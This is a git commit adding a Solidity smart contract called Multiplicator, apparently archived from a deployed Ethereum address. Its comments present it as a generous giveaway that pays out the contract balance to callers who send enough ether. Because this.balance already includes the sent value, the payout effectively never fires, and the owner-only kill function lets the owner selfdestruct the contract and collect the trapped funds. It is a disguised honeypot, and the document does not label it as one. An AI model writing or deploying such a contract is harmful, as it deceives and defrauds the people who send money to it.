bfdb86725f2423b7fd22a03c4f990b3fb39af097
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 16:13:59 +0700

    add contract Multiplicator

--- Multiplicator.sol
+++ Multiplicator.sol
@@ -1,28 +1,32 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Multiplicator at 0xdf77e4a81fba17e0cc39dba521aa4167f388ed7c
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Multiplicator at 0xD7e3C6d99BC2CcdB6FE54B8a5888D14319e65C36
 */
-pragma solidity ^0.4.18;
-
 contract Multiplicator
 {
-    address public Owner = msg.sender;
-   
-    function()payable{}
-   
-    function withdraw()
-    payable
-    public
-    {
-        require(msg.sender == Owner);
-        Owner.transfer(this.balance);
-    }
-    
-    function multiplicate(address adr)
-    payable
-    {
-        if(msg.value>=this.balance)
-        {        
-            adr.transfer(this.balance+msg.value);
+        //Gotta be generous sometimes
+        
+        address public Owner = msg.sender;
+        mapping (address => bool) winner; //keeping track of addresses that have already benefited
+        
+
+
+        function multiplicate(address adr) public payable
+        {
+            
+            if(msg.value>=this.balance)
+            {
+                require(winner[msg.sender] == false);// every address can only benefit once, don't be greedy 
+                winner[msg.sender] = true; 
+                adr.transfer(this.balance+msg.value);
+            }
         }
-    }
+        
+        function kill() {
+            require(msg.sender==Owner);
+            selfdestruct(msg.sender);
+         }
+         
+    //If you want to be generous you can just send ether to this contract without calling any function and others will profit by calling multiplicate
+    function () payable {}
+
 }
